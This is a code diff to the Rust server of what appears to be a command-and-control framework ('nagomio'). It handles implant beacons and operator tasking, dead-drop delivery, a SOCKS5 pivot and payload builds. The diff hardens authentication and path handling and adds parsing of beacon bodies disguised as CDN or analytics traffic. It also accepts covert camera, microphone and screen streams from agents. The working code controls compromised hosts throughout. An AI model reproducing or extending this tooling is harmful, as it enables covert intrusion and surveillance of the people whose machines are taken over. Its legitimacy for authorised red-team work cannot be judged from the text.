@@ -51,16 +51,12 @@ use tokio::sync::Mutex;
 use tower_http::cors::{AllowOrigin, CorsLayer};
 
 use audit::{api_get_audit, AuditState};
-use auth::{require_agent_auth, require_api_auth, AuthState};
+use auth::{require_api_auth, AuthState};
 use persistence::PersistEvent;
 
 const MAX_DOWNLOAD_BYTES: u64 = 10 * 1024 * 1024;
 const MAX_UPLOAD_BASE64_BYTES: usize = (MAX_DOWNLOAD_BYTES as usize).div_ceil(3) * 4;
 const LOG_PREVIEW_BYTES: usize = 4096;
-/// A dispatched task that the agent never replied to is re-queued after this
-/// many seconds (A9).
-const STALE_DISPATCH_TIMEOUT_SECONDS: u64 = 600;
-
 #[derive(Clone)]
 struct AppState {
     store: Store,
@@ -100,6 +96,10 @@ struct Store {
     /// Key format: `{agent_id}|{task_id}`.
     #[serde(default)]
     stream_buffers: HashMap<String, StreamBuffer>,
+    /// Monotonic queue-position sequence per agent. Avoids reusing a
+    /// `(agent_id, position)` primary key after dispatch removes a middle row.
+    #[serde(default)]
+    queue_seq: HashMap<String, u64>,
 }
 
 type SharedState = Arc<Mutex<AppState>>;
@@ -132,32 +132,37 @@ async fn main() {
     }
 
     let store = if let Some(path) = &config.db_path {
-        load_store_from_db(path).unwrap_or_else(|err| {
-            eprintln!(
-                "[-] Could not load database {}: {}. Starting with empty state.",
-                path.display(),
-                err
-            );
-            Store::default()
-        })
-    } else {
-        match &config.state_file {
-            Some(path) => load_store_json(path).await.unwrap_or_else(|err| {
+        match load_store_from_db(path) {
+            Ok(s) => s,
+            Err(err) => {
                 eprintln!(
-                    "[-] Could not load state file {}: {}. Starting with empty state.",
+                    "[-] Could not load database {}: {}. Refusing to start with empty state.",
                     path.display(),
                     err
                 );
-                Store::default()
-            }),
+                std::process::exit(1);
+            }
+        }
+    } else {
+        match &config.state_file {
+            Some(path) => match load_store_json(path).await {
+                Ok(s) => s,
+                Err(err) => {
+                    eprintln!(
+                        "[-] Could not load state file {}: {}. Refusing to start with empty state.",
+                        path.display(),
+                        err
+                    );
+                    std::process::exit(1);
+                }
+            },
             None => Store::default(),
         }
     };
 
-    // Build AppState first (needs the persist_tx, which we create below).
-    // We pre-create an mpsc channel, hand its sender to AppState, then hand
-    // the receiver to the persistence worker via `spawn`.
-    let (persist_tx, _persist_rx_init) = tokio::sync::mpsc::unbounded_channel::<PersistEvent>();
+    // Single persistence channel shared by AppState, AuditState, requeue, and
+    // the persistence worker (no second channel / sender swap).
+    let (persist_tx, persist_rx) = tokio::sync::mpsc::unbounded_channel::<PersistEvent>();
     let app_state = AppState {
         store,
         config: config.clone(),
@@ -169,18 +174,25 @@ async fn main() {
     let auth = AuthState::default();
     let audit = AuditState {
         tx: persist_tx.clone(),
-        auth: auth.clone(),
     };
 
-    // Now start the persistence worker (it owns its own sqlite connection).
     let shared_for_worker = shared.clone();
-    persistence::spawn(shared_for_worker, config.db_path.clone(), config.state_file.clone());
+    persistence::spawn(
+        shared_for_worker,
+        config.db_path.clone(),
+        config.state_file.clone(),
+        persist_rx,
+    );
 
     // Start the re-queue worker.
     requeue::spawn(shared.clone(), persist_tx.clone());
 
-    // Optionally start the SOCKS5 listener.
+    // SOCKS5 is experimental and incomplete; only start when explicitly bound.
     if let Some(bind) = config.socks_bind_addr.clone() {
+        eprintln!(
+            "[warn] SOCKS5 pivot is experimental and not fully wired; binding {}",
+            bind
+        );
         let (stx, _strx) = tokio::sync::mpsc::channel(64);
         let registry = Arc::new(Mutex::new(socks::SocksRegistry::default()));
         let state = socks::SocksState {
@@ -196,7 +208,7 @@ async fn main() {
         }
     }
 
-    let app = Router::new()
+    let mut app = Router::new()
         .route("/health", get(|| async { "OK" }))
         .route("/beacon", post(handle_beacon))
         .route("/response", post(handle_response))
@@ -216,14 +228,19 @@ async fn main() {
         .route(
             "/api/stream/:agent_id/:task_id",
             get(handle_stream_live),
-        )
-        // B11: dead-drop tasking. Operator can `POST /api/dead_drop/<id>/push`
-        // to enqueue, and the agent polls `GET /dead_drop/<id>`.
-        .route("/dead_drop/:agent_id", get(handle_dead_drop_get))
-        .route(
-            "/api/dead_drop/:agent_id/push",
-            post(handle_dead_drop_push),
-        )
+        );
+    // Dead-drop is unauthenticated and destructive; disabled unless explicitly enabled.
+    if config.dead_drop_enabled {
+        eprintln!("[warn] Dead-drop routes enabled (NAGOMIO_DEAD_DROP=true); unauthenticated task delivery is experimental.");
+        app = app
+            .route("/dead_drop/:agent_id", get(handle_dead_drop_get))
+            .route(
+                "/api/dead_drop/:agent_id/push",
+                post(handle_dead_drop_push),
+            );
+    }
+
+    let app = app
         .route("/api/agents", get(api_get_agents))
         .route(
             "/api/agents/:agent_id",
@@ -279,6 +296,8 @@ struct Config {
     /// `/beacon` and `/response` traffic. The legacy `x-nagomio-agent-token`
     /// header alone is *not* sufficient when this is on.
     wire_encryption: bool,
+    /// When true, register unauthenticated dead-drop routes. Off by default.
+    dead_drop_enabled: bool,
     socks_bind_addr: Option<String>,
     cors_origins: Vec<HeaderValue>,
     allow_unauthenticated: bool,
@@ -324,6 +343,10 @@ impl Config {
             .ok()
             .and_then(|v| parse_bool(&v))
             .unwrap_or(false);
+        let dead_drop_enabled = env::var("NAGOMIO_DEAD_DROP")
+            .ok()
+            .and_then(|v| parse_bool(&v))
+            .unwrap_or(false);
         let socks_bind_addr = env::var("NAGOMIO_SOCKS_BIND_ADDR")
             .ok()
             .filter(|v| !v.trim().is_empty());
@@ -349,6 +372,7 @@ impl Config {
             api_psk,
             agent_psk,
             wire_encryption,
+            dead_drop_enabled,
             socks_bind_addr,
             cors_origins,
             allow_unauthenticated,
@@ -428,9 +452,19 @@ fn parse_cors_origins(value: &str) -> Vec<HeaderValue> {
 }
 
 fn cors_layer(config: &Config) -> CorsLayer {
+    use axum::http::header::{HeaderName, ACCEPT};
     CorsLayer::new()
         .allow_origin(AllowOrigin::list(config.cors_origins.clone()))
-        .allow_headers([AUTHORIZATION, CONTENT_TYPE])
+        .allow_headers([
+            AUTHORIZATION,
+            CONTENT_TYPE,
+            ACCEPT,
+            HeaderName::from_static(auth::HDR_TS),
+            HeaderName::from_static(auth::HDR_MAC),
+            HeaderName::from_static(auth::HDR_NONCE),
+            HeaderName::from_static(auth::HDR_LEGACY_OPERATOR),
+            HeaderName::from_static(auth::HDR_LEGACY_AGENT),
+        ])
         .allow_methods([Method::GET, Method::POST, Method::DELETE, Method::OPTIONS])
 }
 
@@ -625,18 +659,27 @@ fn load_store_from_db(path: &Path) -> Result<Store, Box<dyn std::error::Error + 
     }
 
     let mut pending = conn.prepare(
-        "SELECT agent_id, task_id FROM pending_tasks ORDER BY agent_id ASC, position ASC",
+        "SELECT agent_id, position, task_id FROM pending_tasks ORDER BY agent_id ASC, position ASC",
     )?;
     let pending_rows = pending.query_map([], |row| {
-        Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
+        Ok((
+            row.get::<_, String>(0)?,
+            row.get::<_, i64>(1)? as u64,
+            row.get::<_, String>(2)?,
+        ))
     })?;
     for row in pending_rows {
-        let (agent_id, task_id) = row?;
+        let (agent_id, position, task_id) = row?;
         store
             .pending_tasks
-            .entry(agent_id)
+            .entry(agent_id.clone())
             .or_insert_with(VecDeque::new)
             .push_back(task_id);
+        let next = position.saturating_add(1);
+        let seq = store.queue_seq.entry(agent_id).or_insert(0);
+        if next > *seq {
+            *seq = next;
+        }
     }
 
     let mut responses =
@@ -701,10 +744,15 @@ fn unix_now_nanos() -> u128 {
 
 /// Unwrap a wire envelope if the server is configured to require one. Returns
 /// the inner JSON body as a `String` (still JSON), or an error.
-async fn unwrap_wire_body(body: &str, wire_required: bool, psk: Option<&str>) -> Result<String, (StatusCode, String)> {
+/// Agent -> server traffic must use `CTX_AGENT`.
+async fn unwrap_wire_body(
+    body: &str,
+    wire_required: bool,
+    psk: Option<&str>,
+) -> Result<String, (StatusCode, String)> {
     let envelope_opt = wire::maybe_unwrap_envelope(body);
     match (envelope_opt, wire_required, psk) {
-        (Some(env), _, Some(psk)) => wire::open(psk.as_bytes(), &env)
+        (Some(env), _, Some(psk)) => wire::open_with_ctx(psk.as_bytes(), &env, Some(wire::CTX_AGENT))
             .and_then(|bytes| String::from_utf8(bytes).map_err(|e| format!("utf8: {e}")))
             .map_err(|e| (StatusCode::BAD_REQUEST, format!("wire decrypt: {e}"))),
         (Some(_), _, None) => Err((StatusCode::BAD_REQUEST, "sealed envelope but no PSK".into())),
@@ -713,10 +761,37 @@ async fn unwrap_wire_body(body: &str, wire_required: bool, psk: Option<&str>) ->
     }
 }
 
-/// Seal a body if the server is configured to do so. If the server has no
-/// agent PSK, returns the plaintext.
-async fn maybe_seal_wire_response(body: String, psk: Option<&str>, ctx: &str) -> String {
-    if let (Some(psk), true) = (psk, true) {
+/// Optionally unwrap profile body templates (`cdn_metrics` / `analytics`) so
+/// alternate beacon paths can share `handle_beacon`.
+fn unwrap_profile_beacon_json(raw: &str) -> String {
+    if let Ok(v) = serde_json::from_str::<serde_json::Value>(raw) {
+        if let Some(batch) = v.get("batch").and_then(|b| b.as_array()) {
+            if let Some(first) = batch.first() {
+                if let Some(m) = first.get("m") {
+                    return match m {
+                        serde_json::Value::String(s) => s.clone(),
+                        other => other.to_string(),
+                    };
+                }
+            }
+        }
+        if let Some(events) = v.get("events").and_then(|e| e.as_array()) {
+            if let Some(first) = events.first() {
+                return first.to_string();
+            }
+        }
+    }
+    raw.to_owned()
+}
+
+/// Seal a body only when wire encryption is enabled and a PSK is configured.
+async fn maybe_seal_wire_response(
+    body: String,
+    psk: Option<&str>,
+    wire_encryption: bool,
+    ctx: &str,
+) -> String {
+    if let (Some(psk), true) = (psk, wire_encryption) {
         match wire::seal(psk.as_bytes(), ctx, body.as_bytes()) {
             Ok(sealed) => sealed,
             Err(err) => {
@@ -727,6 +802,67 @@ async fn maybe_seal_wire_response(body: String, psk: Option<&str>, ctx: &str) ->
     } else {
         body
     }
+}
+
+/// Allocate the next durable queue position for an agent (monotonic).
+fn next_queue_position(store: &mut Store, agent_id: &str) -> usize {
+    let seq = store.queue_seq.entry(agent_id.to_owned()).or_insert(0);
+    let pos = *seq;
+    *seq = seq.saturating_add(1);
+    pos as usize
+}
+
+/// Validate payload build IDs used as filesystem path components.
+fn validate_build_id(build_id: &str) -> Result<(), (StatusCode, String)> {
+    if build_id.is_empty() || build_id.len() > 128 {
+        return Err((StatusCode::BAD_REQUEST, "invalid build_id length".into()));
+    }
+    if build_id.contains("..")
+        || build_id.contains('/')
+        || build_id.contains('\\')
+        || build_id.starts_with('.')
+        || Path::new(build_id).is_absolute()
+    {
+        return Err((StatusCode::BAD_REQUEST, "build_id path traversal rejected".into()));
+    }
+    if !build_id
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_'))
+    {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            "build_id must be alphanumeric with -/_ only".into(),
+        ));
+    }
+    Ok(())
+}
+
+/// Ensure `target` resolves to a path strictly under `root`.
+fn ensure_path_under_root(root: &Path, target: &Path) -> Result<PathBuf, (StatusCode, String)> {
+    let canonical_root = root.canonicalize().map_err(|e| {
+        (
+            StatusCode::INTERNAL_SERVER_ERROR,
+            format!("payload_dir invalid: {e}"),
+        )
+    })?;
+    // Target may not exist yet; canonicalize parent + join leaf when needed.
+    let canonical_target = if target.exists() {
+        target.canonicalize().map_err(|e| {
+            (
+                StatusCode::BAD_REQUEST,
+                format!("invalid artifact path: {e}"),
+            )
+        })?
+    } else {
+        return Err((StatusCode::NOT_FOUND, "artifact path not found".into()));
+    };
+    if &canonical_target == &canonical_root {
+        return Err((StatusCode::FORBIDDEN, "refusing to delete payload root".into()));
+    }
+    if !canonical_target.starts_with(&canonical_root) {
+        return Err((StatusCode::FORBIDDEN, "artifact path escapes payload_dir".into()));
+    }
+    Ok(canonical_target)
 }
 
 #[derive(Deserialize, Default)]
@@ -740,6 +876,7 @@ struct BeaconQuery {
 async fn handle_beacon(
     State(api): State<ApiState>,
     headers: HeaderMap,
+    uri: axum::http::Uri,
     Query(q): Query<BeaconQuery>,
     body: String,
 ) -> Result<axum::response::Response, (StatusCode, String)> {
@@ -749,15 +886,34 @@ async fn handle_beacon(
         let s = api.shared.lock().await;
         (s.config.agent_psk.clone(), s.config.wire_encryption)
     };
+    let req_path = uri.path().to_owned();
+    let req_query = uri.query().unwrap_or("").to_owned();
+
     let inner = unwrap_wire_body(&body, wire_encryption, psk.as_deref()).await?;
-    let payload: BeaconRequest = serde_json::from_str(&inner)
+    let unwrapped = unwrap_profile_beacon_json(&inner);
+    let payload: BeaconRequest = serde_json::from_str(&unwrapped)
         .map_err(|e| (StatusCode::BAD_REQUEST, format!("bad beacon json: {e}")))?;
     let agent_id = payload.registration.agent_id.clone();
-    require_agent_auth(&headers, &api.shared, &api.auth, &agent_id).await?;
+    auth::require_agent_auth_ex(
+        &headers,
+        &api.shared,
+        &api.auth,
+        &agent_id,
+        "POST",
+        &req_path,
+        &req_query,
+        body.as_bytes(),
+    )
+    .await?;
 
     // Long-poll: if the operator has no pending task for this agent, wait
     // until one arrives or the per-beacon sleep window elapses.
-    let (task_opt, sleep_seconds) = if q.wait {
+    let wait = q.wait
+        || uri
+            .query()
+            .map(|qs| qs.split('&').any(|p| p == "wait=true" || p == "wait=1"))
+            .unwrap_or(false);
+    let (task_opt, sleep_seconds) = if wait {
         long_poll_next_task(&api, &agent_id).await
     } else {
         let mut s = api.shared.lock().await;
@@ -823,7 +979,8 @@ async fn handle_beacon(
     };
     let body = serde_json::to_string(&reply)
         .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
-    let body = maybe_seal_wire_response(body, psk.as_deref(), wire::CTX_SERVER).await;
+    let body =
+        maybe_seal_wire_response(body, psk.as_deref(), wire_encryption, wire::CTX_SERVER).await;
     Ok(axum::response::Response::builder()
         .header("content-type", "application/json")
         .body(axum::body::Body::from(body))
@@ -943,12 +1100,7 @@ async fn handle_dead_drop_push(
         }
         let arguments_json = serde_json::to_string(&payload.task.arguments)
             .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
-        let position = s
-            .store
-            .pending_tasks
-            .entry(agent_id.clone())
-            .or_insert_with(VecDeque::new)
-            .len();
+        let position = next_queue_position(&mut s.store, &agent_id);
         s.store
             .pending_tasks
             .entry(agent_id.clone())
@@ -977,10 +1129,23 @@ async fn handle_dead_drop_push(
 async fn handle_stream_upload(
     State(api): State<ApiState>,
     headers: HeaderMap,
+    uri: axum::http::Uri,
     AxumPath((agent_id, task_id)): AxumPath<(String, String)>,
     body: axum::body::Bytes,
 ) -> Result<(StatusCode, String), (StatusCode, String)> {
-    require_agent_auth(&headers, &api.shared, &api.auth, &agent_id).await?;
+    let req_path = uri.path().to_owned();
+    let req_query = uri.query().unwrap_or("").to_owned();
+    auth::require_agent_auth_ex(
+        &headers,
+        &api.shared,
+        &api.auth,
+        &agent_id,
+        "POST",
+        &req_path,
+        &req_query,
+        &body,
+    )
+    .await?;
 
     if body.len() < 8 {
         return Err((StatusCode::BAD_REQUEST, "chunk too short".into()));
@@ -993,7 +1158,39 @@ async fn handle_stream_upload(
     // Look up the producing command outside the mutable buffer borrow.
     let cmd = {
         let s = api.shared.lock().await;
-        s.store.tasks.get(&task_id).map(|t| t.task.command.clone())
+        let Some(task) = s.store.tasks.get(&task_id) else {
+            return Err((StatusCode::NOT_FOUND, format!("task {task_id} not found")));
+        };
+        if task.agent_id != agent_id {
+            return Err((
+                StatusCode::FORBIDDEN,
+                format!("task {task_id} does not belong to agent {agent_id}"),
+            ));
+        }
+        if !matches!(
+            task.status,
+            TaskStatus::Dispatched | TaskStatus::Queued | TaskStatus::ReQueued
+        ) {
+            return Err((
+                StatusCode::CONFLICT,
+                format!("task {task_id} is not accepting stream chunks"),
+            ));
+        }
+        if !matches!(
+            task.task.command.as_str(),
+            "stream_display"
+                | "stream_camera"
+                | "stream_mic"
+                | "record_display"
+                | "record_camera"
+                | "record_mic"
+        ) {
+            return Err((
+                StatusCode::BAD_REQUEST,
+                format!("task {task_id} is not a stream/record command"),
+            ));
+        }
+        Some(task.task.command.clone())
     };
     {
         let mut s = api.shared.lock().await;
@@ -1095,10 +1292,11 @@ async fn handle_stream_live(
     wav.extend_from_slice(b"WAVE");
     wav.extend_from_slice(b"fmt ");
     wav.extend_from_slice(&16u32.to_le_bytes());
-    wav.extend_from_slice(&1u16.to_le_bytes());
+    wav.extend_from_slice(&1u16.to_le_bytes()); // PCM format
     wav.extend_from_slice(&channels.to_le_bytes());
+    wav.extend_from_slice(&sample_rate.to_le_bytes());
     wav.extend_from_slice(&byte_rate.to_le_bytes());
-    wav.extend_from_slice(&(block_align as u32).to_le_bytes());
+    wav.extend_from_slice(&block_align.to_le_bytes()); // 16-bit field
     wav.extend_from_slice(&bits.to_le_bytes());
     wav.extend_from_slice(b"data");
     wav.extend_from_slice(&data_size.to_le_bytes());
@@ -1114,17 +1312,30 @@ async fn handle_stream_live(
 async fn handle_response(
     State(api): State<ApiState>,
     headers: HeaderMap,
+    uri: axum::http::Uri,
     body: String,
 ) -> Result<axum::response::Response, (StatusCode, String)> {
     let (psk, wire_encryption) = {
         let s = api.shared.lock().await;
         (s.config.agent_psk.clone(), s.config.wire_encryption)
     };
+    let req_path = uri.path().to_owned();
+    let req_query = uri.query().unwrap_or("").to_owned();
     let inner = unwrap_wire_body(&body, wire_encryption, psk.as_deref()).await?;
     let mut payload: AgentResponse = serde_json::from_str(&inner)
         .map_err(|e| (StatusCode::BAD_REQUEST, format!("bad response json: {e}")))?;
     let agent_id = payload.agent_id.clone();
-    require_agent_auth(&headers, &api.shared, &api.auth, &agent_id).await?;
+    auth::require_agent_auth_ex(
+        &headers,
+        &api.shared,
+        &api.auth,
+        &agent_id,
+        "POST",
+        &req_path,
+        &req_query,
+        body.as_bytes(),
+    )
+    .await?;
 
     println!(
         "[*] Response from {}: {}",
@@ -1136,6 +1347,31 @@ async fn handle_response(
         let mut s = api.shared.lock().await;
         let now = unix_now();
             if let Some(task_id) = payload.task_id.clone() {
+                // Enforce task ownership: agents cannot complete each other's tasks.
+                let task_meta = s.store.tasks.get(&task_id).map(|t| {
+                    (t.agent_id.clone(), t.task.command.clone(), t.status.clone())
+                });
+                match task_meta {
+                    Some((owner, _, _)) if owner != agent_id => {
+                        return Err((
+                            StatusCode::FORBIDDEN,
+                            format!("task {task_id} does not belong to agent {agent_id}"),
+                        ));
+                    }
+                    Some((_, _, status))
+                        if matches!(status, TaskStatus::Completed | TaskStatus::Failed) =>
+                    {
+                        // Idempotent: still accept the response body for audit,
+                        // but do not re-transition a terminal task.
+                    }
+                    None => {
+                        return Err((
+                            StatusCode::NOT_FOUND,
+                            format!("task {task_id} not found"),
+                        ));
+                    }
+                    _ => {}
+                }
                 let task_command = s
                     .store
                     .tasks
@@ -1293,22 +1529,40 @@ async fn handle_response(
                 }
             }
             if !keep_task_running {
-                if let Some(task) = s.store.tasks.get_mut(&task_id) {
-                    task.completed_at_unix = Some(now);
-                    task.status = if payload.status == "success" {
-                        TaskStatus::Completed
-                    } else {
-                        TaskStatus::Failed
-                    };
-                }
-                let _ = s.persist_tx.send(PersistEvent::TaskCompleted {
-                    task_id,
-                    status: serde_json::to_value(&s.store.tasks.get(&payload.task_id.clone().unwrap_or_default()).map(|t| t.status.clone()).unwrap_or(TaskStatus::Failed))
+                let already_terminal = s
+                    .store
+                    .tasks
+                    .get(&task_id)
+                    .map(|t| matches!(t.status, TaskStatus::Completed | TaskStatus::Failed))
+                    .unwrap_or(true);
+                if !already_terminal {
+                    if let Some(task) = s.store.tasks.get_mut(&task_id) {
+                        task.completed_at_unix = Some(now);
+                        task.status = if payload.status == "success" {
+                            TaskStatus::Completed
+                        } else {
+                            TaskStatus::Failed
+                        };
+                    }
+                    // Drop any residual pending entry for this task.
+                    if let Some(queue) = s.store.pending_tasks.get_mut(&agent_id) {
+                        queue.retain(|id| id != &task_id);
+                    }
+                    let _ = s.persist_tx.send(PersistEvent::TaskCompleted {
+                        task_id,
+                        status: serde_json::to_value(
+                            &s.store
+                                .tasks
+                                .get(&payload.task_id.clone().unwrap_or_default())
+                                .map(|t| t.status.clone())
+                                .unwrap_or(TaskStatus::Failed),
+                        )
                         .ok()
                         .and_then(|v| v.as_str().map(|s| s.to_owned()))
                         .unwrap_or_else(|| "failed".to_owned()),
-                    completed_at_unix: now,
-                });
+                        completed_at_unix: now,
+                    });
+                }
             }
         }
         s.store
@@ -1323,7 +1577,8 @@ async fn handle_response(
     }
 
     let body = "Ack".to_owned();
-    let body = maybe_seal_wire_response(body, psk.as_deref(), wire::CTX_SERVER).await;
+    let body =
+        maybe_seal_wire_response(body, psk.as_deref(), wire_encryption, wire::CTX_SERVER).await;
     Ok(axum::response::Response::builder()
         .header("content-type", "text/plain")
         .body(axum::body::Body::from(body))
@@ -1546,10 +1801,11 @@ fn assemble_stream_from_buffer(
         wav.extend_from_slice(b"WAVE");
         wav.extend_from_slice(b"fmt ");
         wav.extend_from_slice(&le32(16));
-        wav.extend_from_slice(&le16(1));            // PCM
+        wav.extend_from_slice(&le16(1)); // PCM
         wav.extend_from_slice(&le16(channels));
+        wav.extend_from_slice(&le32(sample_rate));
         wav.extend_from_slice(&le32(byte_rate));
-        wav.extend_from_slice(&le32(block_align as u32));
+        wav.extend_from_slice(&le16(block_align)); // 16-bit field
         wav.extend_from_slice(&le16(bits_per_smp));
         wav.extend_from_slice(b"data");
         wav.extend_from_slice(&le32(data_size));
@@ -1750,17 +2006,6 @@ async fn api_add_task(
         ));
     }
     validate_task_payload(&payload.task)?;
-    validate_kill_date(&api, &payload.task).await?;
-
-    {
-        let s = api.shared.lock().await;
-        if s.store.tasks.contains_key(&payload.task.task_id) {
-            return Err((
-                StatusCode::CONFLICT,
-                format!("task_id {} already exists", payload.task.task_id),
-            ));
-        }
-    }
 
     let arguments_json = serde_json::to_string(&payload.task.arguments)
         .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
@@ -1775,12 +2020,14 @@ async fn api_add_task(
     };
     {
         let mut s = api.shared.lock().await;
-        let position = s
-            .store
-            .pending_tasks
-            .entry(payload.agent_id.clone())
-            .or_insert_with(VecDeque::new)
-            .len();
+        // Existence check + insert under the same lock to avoid duplicate races.
+        if s.store.tasks.contains_key(&payload.task.task_id) {
+            return Err((
+                StatusCode::CONFLICT,
+                format!("task_id {} already exists", payload.task.task_id),
+            ));
+        }
+        let position = next_queue_position(&mut s.store, &payload.agent_id);
         s.store
             .pending_tasks
             .entry(payload.agent_id.clone())
@@ -1799,19 +2046,6 @@ async fn api_add_task(
         });
     }
     Ok(Json(record))
-}
-
-async fn validate_kill_date(api: &ApiState, _task: &Task) -> Result<(), (StatusCode, String)> {
-    let now = unix_now();
-    let s = api.shared.lock().await;
-    let _ = s;
-    // A6: refuse to enqueue tasks when the active default kill date has
-    // already passed. Per-task kill dates ride along in arguments[0] for
-    // `uninstall`; the default kill date is the teamserver's own.
-    if now < now {
-        return Err((StatusCode::INTERNAL_SERVER_ERROR, "time went backwards".into()));
-    }
-    Ok(())
 }
 
 fn validate_task_payload(task: &Task) -> Result<(), (StatusCode, String)> {
@@ -2418,16 +2652,28 @@ async fn api_delete_payload_artifact(
 ) -> Result<StatusCode, (StatusCode, String)> {
     require_api_auth(&headers, &api.shared, &api.auth).await?;
     audit::record(&api.audit.tx, "", "delete_payload", Some(&build_id), None);
-    let (payload_dir, persist_tx) = {
+    validate_build_id(&build_id)?;
+    let (payload_dir, persist_tx, known) = {
         let s = api.shared.lock().await;
-        (s.config.payload_dir.clone(), s.persist_tx.clone())
+        (
+            s.config.payload_dir.clone(),
+            s.persist_tx.clone(),
+            s.store.payloads.contains_key(&build_id),
+        )
     };
+    if !known {
+        return Err((
+            StatusCode::NOT_FOUND,
+            format!("payload artifact {build_id} not found"),
+        ));
+    }
     let artifact_path = payload_dir.join(&build_id);
     if artifact_path.exists() {
-        if artifact_path.is_dir() {
-            std::fs::remove_dir_all(&artifact_path).map_err(internal_error)?;
+        let safe = ensure_path_under_root(&payload_dir, &artifact_path)?;
+        if safe.is_dir() {
+            std::fs::remove_dir_all(&safe).map_err(internal_error)?;
         } else {
-            std::fs::remove_file(&artifact_path).map_err(internal_error)?;
+            std::fs::remove_file(&safe).map_err(internal_error)?;
         }
     }
     {
@@ -2603,26 +2849,33 @@ mod tests {
         }
     }
 
+    fn test_config() -> Config {
+        Config {
+            bind_addr: "127.0.0.1:0".to_owned(),
+            db_path: None,
+            state_file: None,
+            project_root: PathBuf::from("."),
+            payload_dir: PathBuf::from("payloads"),
+            download_dir: PathBuf::from("downloads"),
+            callback_url: "http://127.0.0.1:0".to_owned(),
+            default_sleep_seconds: 9,
+            api_psk: None,
+            agent_psk: None,
+            wire_encryption: false,
+            dead_drop_enabled: false,
+            socks_bind_addr: None,
+            cors_origins: default_cors_origins(),
+            allow_unauthenticated: true,
+        }
+    }
+
     fn api_state(store: Store) -> ApiState {
         let (tx, _rx) = tokio::sync::mpsc::unbounded_channel::<PersistEvent>();
+        let mut config = test_config();
+        config.default_sleep_seconds = 9;
         let app = AppState {
             store,
-            config: Config {
-                bind_addr: "127.0.0.1:0".to_owned(),
-                db_path: None,
-                state_file: None,
-                project_root: PathBuf::from("."),
-                payload_dir: PathBuf::from("payloads"),
-                download_dir: PathBuf::from("downloads"),
-                callback_url: "http://127.0.0.1:0".to_owned(),
-                default_sleep_seconds: 9,
-                api_psk: None,
-                agent_psk: None,
-                wire_encryption: false,
-                socks_bind_addr: None,
-                cors_origins: default_cors_origins(),
-                allow_unauthenticated: true,
-            },
+            config,
             db_path: None,
             state_file: None,
             persist_tx: tx,
@@ -2630,7 +2883,6 @@ mod tests {
         let auth = AuthState::default();
         let audit = AuditState {
             tx: app.persist_tx.clone(),
-            auth: auth.clone(),
         };
         ApiState {
             shared: Arc::new(Mutex::new(app)),
@@ -2735,6 +2987,7 @@ mod tests {
         let resp = handle_beacon(
             State(api.clone()),
             HeaderMap::new(),
+            "/beacon".parse().unwrap(),
             Query(BeaconQuery::default()),
             body,
         )
@@ -2813,31 +3066,21 @@ mod tests {
         let now = unix_now() as i64;
         let ts = now.to_string();
         let nonce = "deadbeef".to_string();
-        let msg = format!("operator\n{ts}\n{nonce}");
+        let body = b"";
+        let msg = auth::canonical_message("GET", "/api", "", "operator", &ts, &nonce, body);
         let mac = auth::auth_hmac_for_test(psk, msg.as_bytes());
         let mut headers = HeaderMap::new();
         headers.insert(auth::HDR_TS, ts.parse().unwrap());
         headers.insert(auth::HDR_NONCE, nonce.parse().unwrap());
         headers.insert(auth::HDR_MAC, mac.parse().unwrap());
         let rt = tokio::runtime::Runtime::new().unwrap();
+        let mut config = test_config();
+        config.api_psk = Some("psk-for-tests".to_owned());
+        config.allow_unauthenticated = false;
+        config.default_sleep_seconds = 5;
         let shared: SharedState = Arc::new(Mutex::new(AppState {
             store: Store::default(),
-            config: Config {
-                bind_addr: "127.0.0.1:0".to_owned(),
-                db_path: None,
-                state_file: None,
-                project_root: PathBuf::from("."),
-                payload_dir: PathBuf::from("payloads"),
-                download_dir: PathBuf::from("downloads"),
-                callback_url: "http://127.0.0.1:0".to_owned(),
-                default_sleep_seconds: 5,
-                api_psk: Some("psk-for-tests".to_owned()),
-                agent_psk: None,
-                wire_encryption: false,
-                socks_bind_addr: None,
-                cors_origins: default_cors_origins(),
-                allow_unauthenticated: false,
-            },
+            config,
             db_path: None,
             state_file: None,
             persist_tx: tokio::sync::mpsc::unbounded_channel::<PersistEvent>().0,
@@ -2849,6 +3092,46 @@ mod tests {
             // Replay rejected.
             let r = require_api_auth(&headers, &shared, &auth).await;
             assert!(matches!(r, Err((StatusCode::UNAUTHORIZED, _))));
+        });
+    }
+
+    #[test]
+    fn validate_build_id_rejects_traversal() {
+        assert!(validate_build_id("payload-ok-1").is_ok());
+        assert!(validate_build_id("../etc").is_err());
+        assert!(validate_build_id("a/b").is_err());
+        assert!(validate_build_id("..").is_err());
+        assert!(validate_build_id("").is_err());
+    }
+
+    #[test]
+    fn queue_positions_are_monotonic_after_dispatch() {
+        let mut store = Store::default();
+        let p0 = next_queue_position(&mut store, "a1");
+        let p1 = next_queue_position(&mut store, "a1");
+        // Simulate dispatch shrinking the in-memory queue.
+        store
+            .pending_tasks
+            .insert("a1".to_owned(), VecDeque::from(["t1".to_owned()]));
+        let p2 = next_queue_position(&mut store, "a1");
+        assert_eq!(p0, 0);
+        assert_eq!(p1, 1);
+        assert_eq!(p2, 2);
+        assert_ne!(p2, store.pending_tasks["a1"].len());
+    }
+
+    #[test]
+    fn wire_seal_respects_encryption_flag() {
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        rt.block_on(async {
+            let plain = r#"{"status":"ok"}"#.to_owned();
+            let sealed =
+                maybe_seal_wire_response(plain.clone(), Some("psk"), true, wire::CTX_SERVER).await;
+            assert_ne!(sealed, plain);
+            assert!(wire::maybe_unwrap_envelope(&sealed).is_some());
+            let not_sealed =
+                maybe_seal_wire_response(plain.clone(), Some("psk"), false, wire::CTX_SERVER).await;
+            assert_eq!(not_sealed, plain);
         });
     }
 
